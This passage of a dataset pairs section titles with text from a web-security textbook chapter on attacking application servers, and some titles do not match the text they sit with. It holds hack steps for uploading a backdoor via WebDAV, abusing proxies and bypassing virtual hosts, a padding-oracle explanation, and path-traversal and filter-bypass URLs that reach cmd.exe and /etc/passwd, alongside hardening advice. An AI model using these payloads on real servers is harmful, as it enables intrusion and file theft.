body.\n1. Use the OPTIONS method to list the HTTP methods that the server states\nare available. Note that different methods may be enabled in different\ndirectories.\n2. In many cases, methods may be advertised as available that you cannot in\nfact use. Sometimes, a method may be usable even though it is not listed\nin the response to the OPTIONS request. Try each method manually to\nconfirm whether it can in fact be used.\n3. If you find that some WebDAV methods are enabled, it is often easiest to\nuse a WebDAV-enabled client for further investigation, such as Microsoft\nFrontPage or the Open as Web Folder option within Internet Explorer.\na. Attempt to use the PUT method to upload a benign file, such as a\ntext file.\nb. If this is successful, try uploading a backdoor script using PUT.\nc. If the necessary extension for the backdoor to operate is being\nblocked, try uploading the file with a .txt extension and using the\nMOVE method to move it to a file with a new extension.\nd. If any of the preceding methods fails, try uploading a JAR file, or a file\nwith contents that a browser will render as HTML.\ne. Recursively step through all the directories using a tool such as\ndavtest.pl.\ncc1188..iinndddd 668811 88//1199//22001111 1122::1177::5533 PPMM"
  },
  {
    "input": "The Application Server as a Proxy",
    "output": "Stuttard c18.indd V2 - 07/28/2011 Page 682\n682 Chapter 18 n Attacking the Application Server\nThe Application Server as a Proxy\nWeb servers are sometimes confi gured to act as forward or reverse HTTP proxy\nservers (see Chapter 3). If a server is confi gured as a forward proxy, depending on its\nconfi guration, it may be possible to leverage the server to perform various attacks:\nn An attacker may be able to use the server to attack third-party systems on\nthe Internet, with the malicious traffi c appearing to the target to originate\nfrom the vulnerable proxy server.\nn An attacker may be able to use the proxy to connect to arbitrary hosts on\nthe organization’s internal network, thereby reaching targets that cannot\nbe accessed directly from the Internet.\nn An attacker may be able to use the proxy to connect back to other services\nrunning on the proxy host itself, circumventing fi rewall restrictions and\npotentially exploiting trust relationships to bypass authentication.\nYou can use two main techniques to cause a forward proxy to make onward\nconnections. First, you can send an HTTP request containing a full URL includ-\ning a hostname and (optionally) a port number:\nGET http://wahh-otherapp.com:80/ HTTP/1.0\nHTTP/1.1 200 OK\n...\nIf the server has been confi gured to forward requests to the specifi ed host, it\nreturns content from that host. Be sure to verify that the content returned is not\nfrom the original server, however. Most web servers accept requests containing\nfull URLs, and many simply ignore the host portion and return the requested\nresource from within their own web root.\nThe second way of leveraging a proxy is to use the CONNECT method to specify\nthe target hostname and port number:\nCONNECT wahh-otherapp.com:443 HTTP/1.0\nHTTP/1.0 200 Connection established\nIf the server responds in this way, it is proxying your connection. This second\ntechnique is often more powerful because the proxy server now simply forwards\nall traffi c sent to and from the specifi ed host. This enables you to tunnel other\nprotocols over the connection and attack non-HTTP–based services. However,\nmost proxy servers impose narrow restrictions on the ports that can be reached\nvia the CONNECT method and usually allow only connections to port 443.\nThe available techniques for exploiting this attack are described in Server-\nSide HTTP Redirection (Chapter 10).\ncc1188..iinndddd 668822 88//1199//22001111 1122::1177::5533 PPMM"
  },
  {
    "input": "Misconfigured Virtual Hosting",
    "output": "82 Stuttard c18.indd V2 - 07/28/2011 Page 683\nChapter 18 n Attacking the Application Server 683\nHACK STEPS\n1. Using both GET and CONNECT requests, try to use the web server as a\nproxy to connect to other servers on the Internet and retrieve content\nfrom them.\n2. Using both techniques, attempt to connect to different IP addresses and\nports within the hosting infrastructure.\n3. Using both techniques, attempt to connect to common port numbers on the\nweb server itself by specifying 127.0.0.1 as the target host in the request.\nMisconfi gured Virtual Hosting\nChapter 17 described how web servers can be confi gured to host multiple web-\nsites, with the HTTP Host header being used to identify the website whose\ncontent should be returned. In Apache, virtual hosts are confi gured as follows:\n<VirtualHost *>\nServerName eis\nDocumentRoot /var/www2\n</VirtualHost>\nIn addition to the DocumentRoot directive, virtual host containers can be used\nto specify other confi guration options for the website in question. A common con-\nfi guration mistake is to overlook the default host so that any security confi guration\napplies to only a virtual host and can be bypassed when the default host is accessed.\nHACK STEPS\n1. Submit GET requests to the root directory using the following:\nn The correct Host header.\nn An arbitrary Host header.\nn The server’s IP address in the Host header.\nn NoHost header.\n2. Compare the responses to these requests. For example, when an IP\naddress is used in the Host header, the server may simply respond with\na directory listing. You may also find that different default content is\naccessible.\n3. If you observe different behavior, repeat your application mapping exer-\ncises using the Host header that generated different results. Be sure to\nperform a Nikto scan using the -vhost option to identify any default con-\ntent that may have been overlooked during initial application mapping.\ncc1188..iinndddd 668833 88//1199//22001111 1122::1177::5533 PPMM"
  },
  {
    "input": "Vulnerable Server Software",
    "output": "Stuttard c18.indd V2 - 07/28/2011 Page 684\n684 Chapter 18 n Attacking the Application Server\nSecuring Web Server Confi guration\nSecuring the confi guration of a web server is not inherently diffi cult. Problems\ntypically arise through an oversight or a lack of awareness. The most important\ntask is to fully understand the documentation for the software you are using\nand any hardening guides available in relation to it.\nIn terms of generic confi guration issues to address, be sure to include all of\nthe following areas:\nn Change any default credentials, including both usernames and passwords\nif possible. Remove any default accounts that are not required.\nn Block public access to administrative interfaces, either by placing ACLs\non the relevant paths within the web root or by fi rewalling access to\nnonstandard ports.\nn Remove all default content and functionality that is not strictly required for\nbusiness purposes. Browse the contents of your web directories to identify\nany remaining items, and use tools such as Nikto as a secondary check.\nn If any default functionality is retained, harden this as far as possible to\ndisable unnecessary options and behavior.\nn Check all web directories for directory listings. Where possible, disable\ndirectory listings in a server-wide confi guration. You can also ensure\nthat each directory contains a fi le such as index.html, which the server\nis confi gured to serve by default.\nn Disable all methods other than those used by the application (typically\nGET and POST).\nn Ensure that the web server is not confi gured to run as a proxy. If this function-\nality is actually required, harden the confi guration as far as possible to allow\nconnections only to the specifi c hosts and ports that should be legitimately\naccessed. You may also implement network-layer fi ltering as a secondary\nmeasure to control outbound requests originating from the web server.\nn If your web server supports virtual hosting, ensure that any security hard-\nening applied is enforced on the default host. Perform the tests described\npreviously to verify that this is the case.\nVulnerable Server Software\nWeb server products range from extremely simple and lightweight software that\ndoes little more than serve static pages to highly complex application platforms\nthat can handle a variety of tasks, potentially providing all but the business\nlogic itself. In the latter example, it is common to develop on the assumption\ncc1188..iinndddd 668844 88//1199//22001111 1122::1177::5533 PPMM"
  },
  {
    "input": "Application Framework Flaws",
    "output": "84 Stuttard c18.indd V2 - 07/28/2011 Page 685\nChapter 18 n Attacking the Application Server 685\nthat this framework is secure. Historically, web server software has been sub-\nject to a wide range of serious security vulnerabilities, which have resulted\nin arbitrary code execution, fi le disclosure, and privilege escalation. Over the\nyears, mainstream web server platforms have become increasingly robust. In\nmany cases core functionality has remained static or has even been reduced as\nvendors have deliberately decreased the default attack surface. Even as these\nvulnerabilities have decreased, the underlying principles remain valid. In the\nfi rst edition of this book, we gave examples of where server software is most\nsusceptible to vulnerabilities. Since that fi rst edition, new instances have been\nreported in each category, often in a parallel technology or server product. Setting\naside some of the smaller personal web servers and other minor targets, these\nnew vulnerabilities have typically arisen in the following:\nn Server-side extensions in both IIS and Apache.\nn Newer web servers that are developed from the ground up to support a\nspecifi c application or that are supplied as part of a development envi-\nronment. These are likely to have received less real-world attention from\nhackers and are more susceptible to the issues described here.\nApplication Framework Flaws\nWeb application frameworks have been the subject of various serious defects\nover the years. We will describe one recent example of a generic example in a\nframework that made vulnerable many applications running on that framework.\nThe .NET Padding Oracle\nOne of the most famous disclosures in recent years is the “padding oracle”\nexploit in .NET. .NET uses PKCS #5 padding on a CBC block cipher, which\noperates as follows.\nA block cipher operates on a fi xed block size, which in .NET is commonly\n8 or 16 bytes. .NET uses the PKCS #5 standard to add padding bytes to every\nplaintext string, ensuring that the resultant plaintext string length is divisible by\nthe block size. Rather than pad the message with an arbitrary value, the value\nselected for padding is the number of padding bytes that is being used. Every\nstring is padded, so if the initial string is a multiple of the block size, a full block\nof padding is added. So in a block size of 8, a message must be padded with\neither one 0x01 byte, two 0x02 bytes, or any of the intermediary combinations\nup to eight 0x08 bytes. The plaintext of the fi rst message is then XORed with a\npreset message block called an initialization vector (IV). (Remember the issues\nwith picking out patterns in ciphertext discussed in Chapter 7.) As described\nin Chapter 7, the second message is then XORed with the ciphertext from the\nfi rst message, starting the cyclic block chain.\ncc1188..iinndddd 668855 88//1199//22001111 1122::1177::5533 PPMM\nStuttard c18.indd V2 - 07/28/2011 Page 686\n686 Chapter 18 n Attacking the Application Server\nThe full .NET encryption process is as follows:\n1. Take a plaintext message.\n2. Pad the message, using the required number of padding bytes as the pad-\nding byte value.\n3. XOR the fi rst plaintext block with the initialization vector.\n4. Encrypt the XORed value from step 3 using Triple-DES.\nFrom then on, the steps of encrypting the rest of the message are recursive\n(this is the cipher block chaining (CBC) process described in Chapter 7):\n5. XOR the second plaintext block with the encrypted previous block.\n6. Encrypt the XORed value using Triple-DES.\nThe Padding Oracle\nVulnerable versions of .NET up to September 2010 contained a seemingly small\ninformation disclosure fl aw. If incorrect padding was found in the message, the\napplication would report an error, resulting in a 500 HTTP response code to the\nuser. Using the behaviors of the PKCS #5 padding algorithm and CBC together,\nthe entire .NET security mechanism could be compromised. Here’s how.\nNote that to be valid, all plaintext strings should include at least one byte\nof padding. Additionally, note that the fi rst block of ciphertext you see is the\ninitialization vector, which serves no purpose other than to XOR against the\nplaintext value of the message’s fi rst encrypted block. For the attack, the attacker\nsupplies a string containing only the fi rst two ciphertext blocks to the appli-\ncation. These two blocks are the IV, followed by the fi rst block of ciphertext.\nThe attacker supplies an IV containing only zeroes and then makes a series\nof requests, sequentially incrementing the last byte of the IV. This last byte is\nXORed with the last byte in the ciphertext, and unless the resultant value for\nthis last byte is 0x01, the cryptographic algorithm throws an error! (Remember\nthat the cleartext value of any string must end in one or more padding values.\nBecause no other padding is present in the fi rst ciphertext block, the last value\nmust be decrypted as 0x01.)\nAn attacker can leverage this error condition: eventually he will hit on the\nvalue that, when XORed with the last byte of the ciphertext block, results in 0x01.\nAt this point the cleartext value of the last byte y can be determined, because:\nx XOR y = 0x01\nso we have just determined the value of x.\nThe same process works on the second-to-last byte in the ciphertext. This\ntime, the attacker (knowing the value of y) chooses the value of x for which the\nlast byte will be decrypted as 0x02. Then he performs the same incremental\nprocess on the second-to-last character in the initialization vector, receiving 500\ncc1188..iinndddd 668866 88//1199//22001111 1122::1177::5533 PPMM"
  },
  {
    "input": "Memory Management Vulnerabilities",
    "output": "86 Stuttard c18.indd V2 - 07/28/2011 Page 687\nChapter 18 n Attacking the Application Server 687\nInternal Server Error messages until the second-to-last decrypted byte is\n0x02. At this point, two 0x02 bytes are at the end of the message, which equates\nto valid padding, and no error is returned. This process can then be recursively\napplied across all bits of the targeted block, and then on the following ciphertext\nblock, through all the blocks in the message.\nIn this way, an attacker can decrypt the whole message. Interestingly, the\nsame mechanism lets the attacker encrypt a message. Once you have recovered\na plaintext string, you can modify the IV to produce the plaintext string of your\nchoosing. One of the best targets is ScriptResource.axd. The d argument of\nScriptResource is an encrypted fi lename. An attacker choosing a fi lename of\nweb.config is served the actual fi le, because ASP.NET bypasses the normal\nrestrictions imposed by IIS in serving the fi le. For example:\nhttps://mdsec.net/ScriptResource.axd?d=SbXSD3uTnhYsK4gMD8fL84_mHPC5jJ7lf\ndnr1_WtsftZiUOZ6IXYG8QCXW86UizF0&t=632768953157700078\nNOTE This attack applies more generally to any CBC ciphers using PKCS #5\npadding. It was originally discussed in 2002, although .NET is a prime tar-\nget because it uses this type of padding for session tokens, ViewState, and\nScriptResource.axd. The original paper can be found at www.iacr.org/\narchive/eurocrypt2002/23320530/cbc02_e02d.pdf.\nWARNING “Never roll your own cryptographic algorithms” is often a throw-\naway comment based on received wisdom. However, the bit fl ipping attack\ndescribed in Chapter 7 and the padding oracle attack just mentioned both show\nhow seemingly tiny anomalies can be practically exploited to produce cata-\nstrophic results. So never roll your own cryptographic algorithms.\nTRY IT!\nhttp://mdsec.net/private/\nMemory Management Vulnerabilities\nBuffer overfl ows are among the most serious fl aws that can affect any kind of soft-\nware, because they normally allow an attacker to take control of execution in the\nvulnerable process (see Chapter 16). Achieving arbitrary code execution within a\nweb server usually enables an attacker to compromise any application it is hosting.\nThe following sections present a tiny sample of web server buffer overfl ows.\nThey illustrate the pervasiveness of this fl aw, which has arisen in a wide range\nof web server products and components.\ncc1188..iinndddd 668877 88//1199//22001111 1122::1177::5544 PPMM\nStuttard c18.indd V2 - 07/28/2011 Page 688\n688 Chapter 18 n Attacking the Application Server\nApache mod_isapi Dangling Pointer\nIn 2010 a fl aw was found whereby Apache’s mod_isapi could be forced to be\nunloaded from memory when encountering errors. The corresponding function\npointers remain in memory and can be called when the corresponding ISAPI\nfunctions are referenced, accessing arbitrary portions of memory.\nFor more information on this fl aw, see www.senseofsecurity.com.au/\nadvisories/SOS-10-002.\nMicrosoft IIS ISAPI Extensions\nMicrosoft IIS versions 4 and 5 contained a range of ISAPI extensions that were\nenabled by default. Several of these were found to contain buffer overfl ows, such\nas the Internet Printing Protocol extension and the Index Server extension, both\nof which were discovered in 2001. These fl aws enabled an attacker to execute\narbitrary code within the Local System context, thereby fully compromising the\nwhole computer. These fl aws also allowed the Nimda and Code Red worms\nto propagate and begin circulating. The following Microsoft TechNet bulletins\ndetail these fl aws:\nn www.microsoft.com/technet/security/bulletin/MS01-023.mspx\nn www.microsoft.com/technet/security/bulletin/MS01-033.mspx\nSeven Years Later\nA further fl aw was found in the IPP service in 2008. This time, the majority\nof deployed versions of IIS on Windows 2003 and 2008 were not immediately\nvulnerable because the extension is disabled by default. The advisory posted by\nMicrosoft can be found at www.microsoft.com/technet/security/bulletin/\nms08-062.mspx.\nApache Chunked Encoding Overfl ow\nA buffer overfl ow resulting from an integer signedness error was discovered in\nthe Apache web server in 2002. The affected code had been reused in numerous\nother web sever products, which were also affected. For more details, see www\n.securityfocus.com/bid/5033/discuss.\nEight Years Later\nIn 2010, an integer overfl ow was found in Apache’s mod_proxy when handling\nchunked encoding in HTTP responses. A write-up of this vulnerability can be\nfound at www.securityfocus.com/bid/37966.\ncc1188..iinndddd 668888 88//1199//22001111 1122::1177::5544 PPMM"
  },
  {
    "input": "Encoding and Canonicalization",
    "output": "88 Stuttard c18.indd V2 - 07/28/2011 Page 689\nChapter 18 n Attacking the Application Server 689\nWebDAV Overfl ows\nA buffer overfl ow in a core component of the Windows operating system was\ndiscovered in 2003. This bug could be exploited through various attack vectors,\nthe most signifi cant of which for many customers was the WebDAV support\nbuilt in to IIS 5. The vulnerability was being actively exploited in the wild at\nthe time a fi x was produced. This vulnerability is detailed at www.microsoft\n.com/technet/security/bulletin/MS03-007.mspx.\nSeven Years Later\nImplementation of WebDAV has introduced vulnerabilities across a range of\nweb servers.\nIn 2010, it was discovered that an overly long path in an OPTIONS request\ncaused an overfl ow in Sun’s Java System Web Server. You can read more about\nthis at www.exploit-db.com/exploits/14287/.\nA further buffer overfl ow issue from 2009 was reported in Apache’s mod_dav\nextension. More details can be found athttp://cve.mitre.org/cgi-bin/cvename\n.cgi?name=CVE-2010-1452.\nEncoding and Canonicalization\nAs described in Chapter 3, various schemes exist that allow special characters\nand content to be encoded for safe transmission over HTTP. You have already\nseen, in the context of several types of web application vulnerabilities, how\nan attacker can leverage these schemes to evade input validation checks and\nperform other attacks.\nEncoding fl aws have arisen in many kinds of application server software.\nThey present an inherent threat in situations where the same user-supplied\ndata is processed by several layers using different technologies. A typical web\nrequest might be handled by the web server, the application platform, various\nmanaged and unmanaged APIs, other software components, and the underly-\ning operating system. If different components handle an encoding scheme in\ndifferent ways, or perform additional decoding or interpretation of data that\nhas already been partially processed, this fact can often be exploited to bypass\nfi lters or cause other anomalous behavior.\nPath traversal is one of the most prevalent vulnerabilities that can be exploited\nvia a canonicalization fl aw because it always involves communication with\nthe operating system. Chapter 10 describes how path traversal vulnerabilities\ncan arise in web applications. The same types of problems have also arisen in\nnumerous types of web server software, enabling an attacker to read or write\narbitrary fi les outside the web root.\ncc1188..iinndddd 668899 88//1199//22001111 1122::1177::5544 PPMM\nStuttard c18.indd V2 - 07/28/2011 Page 690\n690 Chapter 18 n Attacking the Application Server\nApple iDisk Server Path Traversal\nThe Apple iDisk Server is a popular cloud synchronized storage service. In\n2009, Jeremy Richards discovered that it was vulnerable to directory traversal.\nAn iDisk user has a directory structure that includes a public directory, the\ncontents of which are purposely accessible to unauthenticated Internet users.\nRichards discovered that arbitrary content could be retrieved from the private\nsections of a user’s iDisk by using Unicode characters traverse from the public\nfolder to access a private fi le:\nhttp://idisk.mac.com/Jeremy.richards-Public/%2E%2E%2FPRIVATE.txt?disposition=\ndownload+8300\nAn added bonus was that a WebDAV PROPFIND request could be issued fi rst\nto list the contents of the iDisk:\nPOST /Jeremy.richards-Public/<strong>%2E%2E%2F/<strong>?webdav-method=\nPROPFIND\n...\nRuby WEBrick Web Server\nWEBrick is a web server provided as part of Ruby. It was found to be vulnerable\nto a simple traversal fl aw of this form:\nhttp://[server]:[port]/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini\nFor more information about this fl aw, see www.securityfocus.com/bid/28123.\nJava Web Server Directory Traversal\nThis path traversal fl aw exploited the fact that the JVM did not decode UTF-8. Web\nservers written in Java and using vulnerable versions of the JVM included Tomcat,\nand arbitrary content could be retrieved using UTF-8 encoded ../ sequences:\nhttp://www.target.com/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd\nFor more information about this fl aw, see http://tomcat.apache.org\n/security-6.html.\nAllaire JRun Directory Listing Vulnerability\nIn 2001, a vulnerability was found in Allaire JRun that enabled an attacker to\nretrieve directory listings even in directories containing a default fi le such as\nindex.html. A listing could be retrieved using URLs of the following form:\nhttps://wahh-app.com/dir/%3f.jsp\ncc1188..iinndddd 669900 88//1199//22001111 1122::1177::5544 PPMM\n90 Stuttard c18.indd V2 - 07/28/2011 Page 691\nChapter 18 n Attacking the Application Server 691\n%3f is a URL-encoded question mark, which is normally used to denote the\nstart of the query string. The problem arose because the initial URL parser did\nnot interpret the %3f as being the query string indicator. Treating the URL as\nending with .jsp, the server passed the request to the component that handles\nrequests for JSP fi les. This component then decoded the %3f, interpreted it\nas the start of the query string, found that the resulting base URL was not\na JSP fi le, and returned the directory listing. Further details can be found at\nwww.securityfocus.com/bid/3592.\nEight Years Later\nIn 2009, a similar much lower-risk vulnerability was announced in Jetty\nrelating to directory traversal in situations where a directory name ended\nin a question mark. The solution was to encode the ? as %3f. Details can be\nfound at https://www.kb.cert.org/vuls/id/402580.\nMicrosoft IIS Unicode Path Traversal Vulnerabilities\nTwo related vulnerabilities were identifi ed in the Microsoft IIS server in 2000\nand 2001. To prevent path traversal attacks, IIS checked for requests contain-\ning the dot-dot-slash sequence in both its literal and URL-encoded forms. If a\nrequest did not contain these expressions, it was accepted for further processing.\nHowever, the server then performed some additional canonicalization on the\nrequested URL, enabling an attacker to bypass the fi lter and cause the server\nto process traversal sequences.\nIn the fi rst vulnerability, an attacker could supply various illegal Unicode-\nencoded forms of the dot-dot-slash sequence, such as ..%c0%af. This expression\ndid not match IIS’s upfront fi lters, but the later processing tolerated the illegal\nencoding and converted it back to a literal traversal sequence. This enabled an\nattacker to step out of the web root and execute arbitrary commands with URLs\nlike the following:\nhttps://wahh-app.com/scripts/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../\nwinnt/system32/cmd.exe?/c+dir+c:\\\nIn the second vulnerability, an attacker could supply double-encoded forms\nof the dot-dot-slash sequence, such as ..%255c. Again, this expression did not\nmatch IIS’s fi lters, but the later processing performed a superfl uous decode of\nthe input, thereby converting it back to a literal traversal sequence. This enabled\nan alternative attack with URLs like the following:\nhttps://wahh-app.com/scripts/..%255c..%255c..%255c..%255c..%255c..\n%255cwinnt/system32/cmd.exe?/c+dir+c:\\\ncc1188..iinndddd 669911 88//1199//22001111 1122::1177::5544 PPMM\nStuttard c18.indd V2 - 07/28/2011 Page 692\n692 Chapter 18 n Attacking the Application Server\nFurther details on these vulnerabilities can be found here:\nn www.microsoft.com/technet/security/bulletin/MS00-078.mspx\nn www.microsoft.com/technet/security/bulletin/MS01-026.mspx\nNine Years Later\nThe enduring signifi cance of encoding and canonicalization vulnerabilities in\nweb server software can be seen in the reemergence of a similar IIS vulnerability,\nthis time in WebDAV, in 2009. A fi le protected by IIS could be downloaded by\ninserting a rogue %c0%af string into the URL. IIS grants access to this resource\nbecause it does not appear to be a request for the protected fi le. But the rogue\nstring is later stripped from the request:\nGET /prote%c0%afcted/protected.zip HTTP/1.1\nTranslate: f\nConnection: close\nHost: wahh-app.net\nThe Translate: f header ensures that this request is handled by the WebDAV\nextension. The same attack can be carried out directly within a WebDAV request\nusing the following:\nPROPFIND /protec%c0%afted/ HTTP/1.1\nHost: wahh-app.net\nUser-Agent: neo/0.12.2\nConnection: TE\nTE: trailers\nDepth: 1\nContent-Length: 288\nContent-Type: application/xml\n<?xml version=”1.0” encoding=”utf-8”?>\n<propfind xmlns=”DAV:”><prop>\n<getcontentlength xmlns=”DAV:”/>\n<getlastmodified xmlns=”DAV:”/>\n<executable xmlns=”http://apache.org/dav/props/”/>\n<resourcetype xmlns=”DAV:”/>\n<checked-in xmlns=”DAV:”/>\n<checked-out xmlns=”DAV:”/>\n</prop></propfind>\nFor more information, see www.securityfocus.com/bid/34993/.\nOracle PL/SQL Exclusion List Bypasses\nRecall the dangerous default functionality that was accessible via Oracle’s PL/\nSQL gateway. To address this issue, Oracle created the PL/SQL Exclusion List,\ncc1188..iinndddd 669922 88//1199//22001111 1122::1177::5544 PPMM\n92 Stuttard c18.indd V2 - 07/28/2011 Page 693\nChapter 18 n Attacking the Application Server 693\nwhich blocks access to packages whose names begin with certain expressions,\nsuch as OWA and SYS.\nBetween 2001 and 2007, David Litchfi eld discovered a series of bypasses to the\nPL/SQL Exclusion List . In the fi rst vulnerability, the fi lter can be bypassed by\nplacing whitespace (such as a newline, space, or tab) before the package name:\nhttps://wahh-app.com/pls/dad/%0ASYS.package.procedure\nThis bypasses the fi lter, and the back-end database ignores the whitespace,\ncausing the dangerous package to be executed.\nIn the second vulnerability, the fi lter can be bypassed by replacing the letter\nY with %FF, which represents the ÿ character:\nhttps://wahh-app.com/pls/dad/S%FFS.package.procedure\nThis bypasses the fi lter, and the back-end database canonicalizes the character\nback to a standard Y, thereby invoking the dangerous package.\nIn the third vulnerability, the fi lter can be bypassed by enclosing a blocked\nexpression in double quotation marks:\nhttps://wahh-app.com/pls/dad/”SYS”.package.procedure\nThis bypasses the fi lter, and the back-end database tolerates quoted package\nnames, meaning that the dangerous package is invoked.\nIn the fourth vulnerability, the fi lter can be bypassed by using angle brackets\nto place a programming goto label before the blocked expression:\nhttps://wahh-app.com/pls/dad/<<FOO>>SYS.package.procedure\nThis bypasses the fi lter. The back-end database ignores the goto label and\nexecutes the dangerous package.\nEach of these different vulnerabilities arises because the front-end fi ltering is\nperformed by one component on the basis of simple text-based pattern matching.\nThe subsequent processing is performed by a different component that follows\nits own rules to interpret the syntactic and semantic signifi cance of the input.\nAny differences between the two sets of rules may present an opportunity for\nan attacker to supply input that does not match the patterns used in the fi lter\nbut that the database interprets in such a way that the attacker’s desired package\nis invoked. Because the Oracle database is so functional, there is ample room\nfor differences of this kind to arise.\nMore information about these vulnerabilities can be found here:\nn www.securityfocus.com/archive/1/423819/100/0/threaded\nn TheOracleHacker’sHandbook by David Litchfi eld (Wiley, 2007)\ncc1188..iinndddd 669933 88//1199//22001111 1122::1177::5555 PPMM"
  },
  {
    "input": "Finding Web Server Flaws",
    "output": "Stuttard c18.indd V2 - 07/28/2011 Page 694\n694 Chapter 18 n Attacking the Application Server\nSeven Years Later\nAn issue was discovered in 2008 within the Portal Server (part of the Oracle\nApplication Server). An attacker with a session ID cookie value ending in %0A\nwould be able to bypass the default Basic Authentication check.\nFinding Web Server Flaws\nIf you are lucky, the web server you are targeting may contain some of the actual\nvulnerabilities described in this chapter. More likely, however, it will have been\npatched to a more recent level, and you will need to search for something fairly\ncurrent or brand new with which to attack the server.\nA good starting point when looking for vulnerabilities in an off-the-shelf\nproduct such as a web server is to use an automated scanning tool. Unlike web\napplications, which are usually custom-built, almost all web server deployments\nuse third-party software that has been installed and confi gured in the same\nway that countless other people have done before. In this situation, automated\nscanners can be quite effective at quickly locating low-hanging fruit by send-\ning huge numbers of crafted requests and monitoring for signatures indicating\nthe presence of known vulnerabilities. Nessus is an excellent free vulnerability\nscanner, and various commercial alternatives are available.\nIn addition to running scanning tools, you should always perform your own\nresearch on the software you are attacking. Consult resources such as Security\nFocus, OSVDB, and the mailing lists Bugtraq and Full Disclosure to fi nd details\nof any recently discovered vulnerabilities that may not have been fi xed on your\ntarget. Always check the Exploit Database and Metasploit to see if someone\nhas done the work for you and created the corresponding exploit as well. The\nfollowing URLs should help:\nn www.exploit-db.com\nn www.metasploit.com/\nn www.grok.org.uk/full-disclosure/\nn http://osvdb.org/search/advsearch\nYou should be aware that some web application products include an open source\nweb server such as Apache or Jetty as part of their installation. Security updates\nto these bundled servers may be applied more slowly because administrators\nmay view the server as part of the installed application, rather than as part of the\ninfrastructure they are responsible for. Applying a direct update rather than wait-\ning for the application vendor’s patch is also likely to invalidate support contracts.\nTherefore, performing some manual testing and research on the software may\nbe highly effective in identifying defects that an automated scanner may miss.\nIf possible, you should consider performing a local installation of the software\nyou are attacking, and carry out your own testing to fi nd new vulnerabilities\nthat have not been discovered or widely circulated.\ncc1188..iinndddd 669944 88//1199//22001111 1122::1177::5555 PPMM"
  },
  {
    "input": "Securing Web Server Software",
    "output": "94 Stuttard c18.indd V2 - 07/28/2011 Page 695\nChapter 18 n Attacking the Application Server 695\nSecuring Web Server Software\nTo some extent, an organization deploying a third-party web server product\ninevitably places its fate in the hands of the software vendor. Nevertheless, a\nsecurity-conscious organization can do a lot to protect itself against the kind\nof software vulnerabilities described in this chapter.\nChoose Software with a Good Track Record\nNot all software products and vendors are created equal. Taking a look at the\nrecent history of different server products reveals some marked differences\nin the quantity of serious vulnerabilities found, the time taken by vendors to\nresolve them, and the resilience of the released fi xes to subsequent testing by\nresearchers. Before choosing which web server software to deploy, you should\ninvestigate these differences and consider how your organization would have\nfared in recent years if it had used each kind of software you are considering.\nApply Vendor Patches\nAny decent software vendor must release security updates periodically. Sometimes\nthese address issues that the vendor itself discovered in-house. In other cases,\nthe problems were reported by an independent researcher, who may or may\nnot have kept the information to herself. Other vulnerabilities are brought to\nthe vendor’s attention because they are being actively exploited in the wild. But\nin every case, as soon as a patch is released, any decent reverse engineer can\nquickly pinpoint the issue it addresses, enabling attackers to develop exploits\nfor the problem. Wherever feasible, therefore, security fi xes should be applied\nas soon as possible after they are made available.\nPerform Security Hardening\nMost web servers have numerous confi gurable options controlling what functionality\nis enabled and how it behaves. If unused functionality, such as default ISAPI exten-\nsions, is left enabled, your server is at increased risk of attack if new vulnerabilities\nare discovered within that functionality. You should consult hardening guides\nspecifi c to the software you are using, but here are some generic steps to consider:\nn Disable any built-in functionality that is not required, and confi gure the\nremaining functionality to behave as restrictively as possible, consistent\nwith your business requirements. This may include removing mapped\nfi le extensions, web server modules, and database components. You can\nuse tools such as IIS Lockdown to facilitate this task.\nn If the application itself is composed of any additional custom-written\nserver extensions developed in native code, consider whether these can be\ncc1188..iinndddd 669955 88//1199//22001111 1122::1177::5555 PPMM\nStuttard c18.indd V2 - 07/28/2011 Page 696\n696 Chapter 18 n Attacking the Application Server\nrewritten using managed code. If they can’t, ensure that additional input\nvalidation is performed by your managed-code environment before it is\npassed to these functions.\nn Many functions and resources that you need to retain can often be renamed\nfrom their default values to present an additional barrier to exploitation. Even\nif a skilled attacker may still be able to discover the new name, this obscu-\nrity measure defends against less-skilled attackers and automated worms.\nn Apply the principle of least privilege throughout the technology stack. For\nexample, container security can cut down the attack surface presented to\na standard application user. The web server process should be confi gured\nto use the least powerful operating system account possible. On UNIX-\nbased systems, a chrooted environment can be used to further contain\nthe impact of any compromise.\nMonitor for New Vulnerabilities\nSomeone in your organization should be assigned to monitor resources such\nas Bugtraq and Full Disclosure for announcements and discussions about new\nvulnerabilities in the software you are using. You can also subscribe to various\nprivate services to receive early notifi cation of known vulnerabilities in soft-\nware that have not yet been publicly disclosed. Often, if you know the technical\ndetails of a vulnerability, you can implement an effective work-around pending\nrelease of a full fi x by the vendor.\nUse Defense-in-Depth\nYou should always implement layers of protection to mitigate the impact of a\nsecurity breach within any component of your infrastructure. You can take vari-\nous steps to help localize the impact of a successful attack on your web server.\nEven in the event of a complete compromise, these may give you suffi cient time\nto respond to the incident before any signifi cant data loss occurs:\nn You can impose restrictions on the web server’s capabilities from other,\nautonomous components of the application. For example, the database\naccount used by the application can be given only INSERT access to the tables\nused to store audit logs. This means that an attacker who compromises the\nweb server cannot delete any log entries that have already been created.\nn You can impose strict network-level fi lters on traffi c to and from the web\nserver.\nn You can use an intrusion detection system to identify any anomalous\nnetwork activity that may indicate that a breach has occurred. After com-\npromising a web server, many attackers immediately attempt to create\ncc1188..iinndddd 669966 88//1199//22001111 1122::1177::5555 PPMM"
  },
  {
    "input": "Web Application Firewalls",
    "output": "96 Stuttard c18.indd V2 - 07/28/2011 Page 697\nChapter 18 n Attacking the Application Server 697\na reverse connection to the Internet or scan for other hosts on the DMZ\nnetwork. An effective IDS will notify you of these events in real time,\nenabling you to take measures to arrest the attack.\nWeb Application Firewalls\nMany applications are protected by an external component residing either on\nthe same host as the application or on a network-based device. These can be\ncategorized as performing either intrusion prevention (application fi rewalls) or\ndetection (such as conventional intrusion detection systems). Due to similarities\nin how these devices identify attacks, we will treat them fairly interchangeably.\nAlthough many would argue that having these is better than nothing at all, in\nmany cases they may create a false sense of security in the belief that an extra\nlayer of defense implies an automatic improvement of the defensive posture.\nSuch a system is unlikely to lower the security and may be able to stop a clearly\ndefi ned attack such as an Internet worm, but in other cases it may not be improv-\ning security as much as is sometimes believed.\nImmediately it can be noted that unless such defenses employ heavily custom-\nized rules, they do not protect against any of the vulnerabilities discussed in\nChapters 4 through 8 and have no practical use in defending potential fl aws in\nbusiness logic (Chapter 11). They also have no role to play in defending against\nsome specifi c attacks such as DOM-based XSS 